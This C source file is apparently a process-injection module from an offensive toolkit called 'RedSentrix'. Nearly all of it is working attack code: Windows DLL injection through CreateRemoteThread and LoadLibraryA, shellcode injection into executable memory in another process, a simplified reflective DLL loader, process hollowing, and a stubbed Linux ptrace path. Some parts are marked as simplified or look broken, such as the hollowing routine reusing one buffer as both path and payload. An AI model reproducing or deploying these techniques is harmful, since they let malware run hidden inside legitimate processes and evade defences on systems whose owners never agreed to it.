/*
 * RedSentrix - Process Injection Module (C)
 * Handles various process injection techniques
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <winternl.h>

// Windows-specific types
typedef LONG NTSTATUS;
typedef NTSTATUS (WINAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
#else
#include <sys/ptrace.h>
#include <sys/wait.h>
#endif

// Process injection structure
typedef struct {
    void *shellcode;
    size_t shellcode_size;
    pid_t target_pid;
    int injection_method;
} injection_ctx_t;

// Injection methods
#define INJECT_METHOD_DLL 1
#define INJECT_METHOD_SHELLCODE 2
#define INJECT_METHOD_REFLECTIVE 3
#define INJECT_METHOD_PROCESS_HOLLOWING 4

/*
 * DLL Injection (Windows)
 */
#ifdef _WIN32
int inject_dll(pid_t pid, const char *dll_path) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return -1;
    }

    // Allocate memory in target process
    size_t path_len = strlen(dll_path) + 1;
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, path_len, 
                                          MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return -1;
    }

    // Write DLL path to remote memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dll_path, path_len, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Get LoadLibraryA address
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        GetProcAddress(hKernel32, "LoadLibraryA");

    // Create remote thread to load DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, 
                                        pRemoteMemory, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return 0;
}
#endif

/*
 * Shellcode Injection
 */
int inject_shellcode(pid_t pid, void *shellcode, size_t shellcode_size) {
#ifdef _WIN32
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return -1;
    }

    // Allocate executable memory
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, shellcode_size,
                                          MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return -1;
    }

    // Write shellcode
    if (!WriteProcessMemory(hProcess, pRemoteMemory, shellcode, 
                           shellcode_size, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pRemoteMemory,
                                       NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
#else
    // Linux implementation using ptrace
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        return -1;
    }
    waitpid(pid, NULL, 0);

    // Get registers
    struct user_regs_struct regs;
    ptrace(PTRACE_GETREGS, pid, NULL, &regs);

    // Allocate memory for shellcode
    void *remote_mem = (void *)regs.rip;
    // Write shellcode (simplified - actual implementation more complex)
    
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
#endif
}

/*
 * Reflective DLL Loading
 */
#ifdef _WIN32
int inject_reflective_dll(pid_t pid, void *dll_data, size_t dll_size) {
    // Reflective DLL injection - loads DLL from memory without touching disk
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        return -1;
    }

    // Allocate memory for DLL
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dll_size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);
    if (!pRemoteMemory) {
        CloseHandle(hProcess);
        return -1;
    }

    // Write DLL to remote memory
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dll_data, dll_size, NULL)) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    // Create remote thread to execute DLL's entry point
    // (Simplified - actual reflective loading requires DLL parsing)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)pRemoteMemory,
                                       NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
#endif

/*
 * Process Hollowing
 */
#ifdef _WIN32
int process_hollowing(const char *target_path, void *shellcode, size_t shellcode_size) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // Create process in suspended state
    if (!CreateProcessA(NULL, (LPSTR)target_path, NULL, NULL, FALSE,
                       CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return -1;
    }

    // Get base address of image
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Read PEB to get image base
    LPVOID pImageBase = NULL;
    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Ebx + 8), &pImageBase, 
                     sizeof(pImageBase), NULL);

    // Unmap original image
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll) {
        NtUnmapViewOfSection_t NtUnmapViewOfSection = 
            (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
        if (NtUnmapViewOfSection) {
            NtUnmapViewOfSection(pi.hProcess, pImageBase);
        }
    }

    // Allocate new memory at original base
    LPVOID pNewImageBase = VirtualAllocEx(pi.hProcess, pImageBase, shellcode_size,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_EXECUTE_READWRITE);
    if (!pNewImageBase) {
        TerminateProcess(pi.hProcess, 0);
        return -1;
    }

    // Write shellcode
    WriteProcessMemory(pi.hProcess, pNewImageBase, shellcode, shellcode_size, NULL);

    // Update entry point
    ctx.Eax = (DWORD)pNewImageBase;
    SetThreadContext(pi.hThread, &ctx);

    // Resume thread
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
#endif

/*
 * Main injection function
 */
int perform_injection(injection_ctx_t *ctx) {
    switch (ctx->injection_method) {
        case INJECT_METHOD_SHELLCODE:
            return inject_shellcode(ctx->target_pid, ctx->shellcode, ctx->shellcode_size);
#ifdef _WIN32
        case INJECT_METHOD_DLL:
            return inject_dll(ctx->target_pid, (const char *)ctx->shellcode);
        case INJECT_METHOD_REFLECTIVE:
            return inject_reflective_dll(ctx->target_pid, ctx->shellcode, ctx->shellcode_size);
        case INJECT_METHOD_PROCESS_HOLLOWING:
            return process_hollowing((const char *)ctx->shellcode, ctx->shellcode, ctx->shellcode_size);
#endif
        default:
            return -1;
    }
}

